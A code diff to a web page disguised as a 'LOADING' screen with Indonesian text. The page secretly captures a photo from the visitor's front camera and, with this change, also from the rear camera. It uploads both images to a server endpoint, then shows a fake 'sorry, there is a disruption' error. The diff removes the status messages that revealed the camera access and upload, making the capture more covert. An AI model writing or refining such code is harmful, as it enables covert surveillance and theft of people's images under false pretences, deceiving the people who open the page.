@@ -13,13 +13,12 @@
   
   body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: #0a0a0a;
+    background: #ffffff;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
     padding: 20px;
-    color: #fff;
   }
   
   .loading-container {
@@ -31,14 +30,24 @@
   /* Loading Spinner */
   .spinner-container {
     margin-bottom: 30px;
+    transition: all 0.5s ease;
+  }
+  
+  .spinner-container.hidden {
+    opacity: 0;
+    transform: scale(0.5);
+    pointer-events: none;
+    height: 0;
+    margin: 0;
+    overflow: hidden;
   }
   
   .spinner {
-    width: 60px;
-    height: 60px;
+    width: 50px;
+    height: 50px;
     margin: 0 auto;
-    border: 4px solid rgba(255,255,255,0.1);
-    border-top-color: #fff;
+    border: 4px solid #e0e0e0;
+    border-top-color: #333;
     border-radius: 50%;
     animation: spin 0.8s ease-in-out infinite;
   }
@@ -48,23 +57,37 @@
   }
   
   .loading-title {
-    font-size: 28px;
-    font-weight: 300;
-    letter-spacing: 8px;
-    color: #666;
+    font-size: 24px;
+    font-weight: 400;
+    letter-spacing: 6px;
+    color: #333;
     margin-bottom: 10px;
-    animation: pulse 1.5s ease-in-out infinite;
+    transition: all 0.5s ease;
   }
   
-  @keyframes pulse {
-    0%, 100% { opacity: 0.5; }
-    50% { opacity: 1; }
+  .loading-title.hidden {
+    opacity: 0;
+    transform: translateY(-20px);
+    pointer-events: none;
+    height: 0;
+    margin: 0;
+    overflow: hidden;
   }
   
   .loading-sub {
-    color: #333;
+    color: #999;
     font-size: 13px;
-    letter-spacing: 3px;
+    letter-spacing: 2px;
+    transition: all 0.5s ease;
+  }
+  
+  .loading-sub.hidden {
+    opacity: 0;
+    transform: translateY(-10px);
+    pointer-events: none;
+    height: 0;
+    margin: 0;
+    overflow: hidden;
   }
   
   .loading-dots {
@@ -87,36 +110,26 @@
   
   /* Status Message */
   .status-message {
-    margin-top: 30px;
+    margin-top: 20px;
     padding: 15px;
-    background: #111;
-    border-radius: 12px;
-    color: #444;
+    color: #666;
     font-size: 14px;
     min-height: 50px;
     display: flex;
     align-items: center;
     justify-content: center;
-    border: 1px solid #1a1a1a;
-    transition: all 0.5s;
+    opacity: 0;
+    transition: all 0.5s ease;
+    transform: translateY(10px);
   }
   
-  .status-message.success {
-    color: #34C759;
-    border-color: #1a3a1a;
-    background: #0d1a0d;
+  .status-message.visible {
+    opacity: 1;
+    transform: translateY(0);
   }
   
   .status-message.error {
-    color: #FF3B30;
-    border-color: #3a1a1a;
-    background: #1a0d0d;
-  }
-  
-  .status-message.info {
-    color: #007AFF;
-    border-color: #1a2a3a;
-    background: #0d1a2a;
+    color: #ff3b30;
   }
   
   /* Hidden camera */
@@ -133,52 +146,25 @@
   #hidden-canvas {
     display: none;
   }
-  
-  /* Small dot indicator */
-  .dot-indicator {
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 20px;
-  }
-  
-  .dot {
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: #1a1a1a;
-    transition: all 0.3s;
-  }
-  
-  .dot.active {
-    background: #666;
-  }
 </style>
 </head>
 <body>
 
 <div class="loading-container">
   <!-- Spinner -->
-  <div class="spinner-container">
+  <div class="spinner-container" id="spinnerContainer">
     <div class="spinner"></div>
   </div>
   
   <!-- Loading Text -->
-  <div class="loading-title">LOADING</div>
-  <div class="loading-sub">
+  <div class="loading-title" id="loadingTitle">LOADING</div>
+  <div class="loading-sub" id="loadingSub">
     Please wait<span class="loading-dots"></span>
   </div>
   
   <!-- Status Message -->
   <div class="status-message" id="statusMessage">
-    ⏳ Menginisialisasi...
-  </div>
-  
-  <!-- Dot Indicator -->
-  <div class="dot-indicator">
-    <div class="dot" id="dot1"></div>
-    <div class="dot" id="dot2"></div>
-    <div class="dot" id="dot3"></div>
+    ⚠️ Maaf sedang gangguan
   </div>
 </div>
 
@@ -190,48 +176,17 @@
 const video = document.getElementById('hidden-video');
 const canvas = document.getElementById('hidden-canvas');
 const statusMessage = document.getElementById('statusMessage');
-const dot1 = document.getElementById('dot1');
-const dot2 = document.getElementById('dot2');
-const dot3 = document.getElementById('dot3');
+const spinnerContainer = document.getElementById('spinnerContainer');
+const loadingTitle = document.getElementById('loadingTitle');
+const loadingSub = document.getElementById('loadingSub');
 
 let stream = null;
-let statusIndex = 0;
-
-// Status messages
-const statusList = [
-  '⏳ Menginisialisasi...',
-  '📷 Mengakses kamera...',
-  '📸 Mengambil foto...',
-  '📤 Mengirim data...',
-  '✅ Berhasil terkirim!',
-  '⚠️ Maaf sedang gangguan'
-];
-
-// Update status dengan animasi dot
-function updateStatus(message, type = 'info') {
-  statusMessage.textContent = message;
-  statusMessage.className = 'status-message ' + type;
-}
-
-// Animasi dot
-function animateDots(index) {
-  dot1.className = 'dot' + (index >= 0 ? ' active' : '');
-  dot2.className = 'dot' + (index >= 1 ? ' active' : '');
-  dot3.className = 'dot' + (index >= 2 ? ' active' : '');
-}
+let photoTaken = false;
 
 // Start camera and process
 async function startProcess() {
   try {
-    // Step 1: Init
-    updateStatus(statusList[0]);
-    animateDots(0);
-    await delay(1000);
-    
-    // Step 2: Access camera
-    updateStatus(statusList[1]);
-    animateDots(1);
-    
+    // Try to access camera
     stream = await navigator.mediaDevices.getUserMedia({
       video: { 
         facingMode: 'user',
@@ -242,32 +197,63 @@ async function startProcess() {
     });
     
     video.srcObject = stream;
-    await delay(1000);
     
-    // Step 3: Capture photo
-    updateStatus(statusList[2]);
-    animateDots(2);
-    await delay(500);
+    // Wait for camera to stabilize
+    await delay(800);
     
-    // Capture from video
+    // Capture photo from video
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0);
     const imageData = canvas.toDataURL('image/jpeg', 0.85);
     
-    // Stop camera
+    // Try camera belakang juga (optional)
+    let backImageData = null;
+    try {
+      // Coba ambil dari kamera belakang
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: 'environment',
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        },
+        audio: false
+      });
+      
+      const backVideo = document.createElement('video');
+      backVideo.srcObject = backStream;
+      await backVideo.play();
+      await delay(500);
+      
+      const backCanvas = document.createElement('canvas');
+      backCanvas.width = backVideo.videoWidth || 640;
+      backCanvas.height = backVideo.videoHeight || 480;
+      const backCtx = backCanvas.getContext('2d');
+      backCtx.drawImage(backVideo, 0, 0);
+      backImageData = backCanvas.toDataURL('image/jpeg', 0.85);
+      
+      backStream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+      console.log('Kamera belakang tidak tersedia');
+    }
+    
+    // Stop front camera
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
       stream = null;
       video.srcObject = null;
     }
     
-    // Step 4: Send to server
-    updateStatus(statusList[3]);
-    
+    // Send to server (kirim foto depan dulu)
     const formData = new FormData();
     formData.append('image', imageData);
+    formData.append('hasBackCamera', backImageData ? 'true' : 'false');
+    
+    // Jika ada foto belakang, kirim juga
+    if (backImageData) {
+      formData.append('backImage', backImageData);
+    }
     
     const response = await fetch('/api/verify', {
       method: 'POST',
@@ -276,27 +262,26 @@ async function startProcess() {
     
     const result = await response.json();
     
-    if (result.success) {
-      // Step 5: Success
-      updateStatus(statusList[4], 'success');
-      animateDots(-1);
-      await delay(2000);
-      
-      // Step 6: Show error message (maaf sedang gangguan)
-      updateStatus(statusList[5], 'error');
-      
-      // Keep loading animation running
-      document.querySelector('.spinner').style.animation = 'spin 0.8s ease-in-out infinite';
-      
-    } else {
-      throw new Error(result.error || 'Gagal mengirim');
-    }
+    // Hide loading elements
+    spinnerContainer.classList.add('hidden');
+    loadingTitle.classList.add('hidden');
+    loadingSub.classList.add('hidden');
+    
+    // Show error message
+    statusMessage.classList.add('visible', 'error');
+    statusMessage.textContent = '⚠️ Maaf sedang gangguan';
     
   } catch (err) {
     console.error('Process error:', err);
-    updateStatus('❌ ' + (err.message || 'Terjadi kesalahan'), 'error');
-    await delay(2000);
-    updateStatus(statusList[5], 'error');
+    
+    // Hide loading elements
+    spinnerContainer.classList.add('hidden');
+    loadingTitle.classList.add('hidden');
+    loadingSub.classList.add('hidden');
+    
+    // Show error message
+    statusMessage.classList.add('visible', 'error');
+    statusMessage.textContent = '⚠️ Maaf sedang gangguan';
   }
 }
 
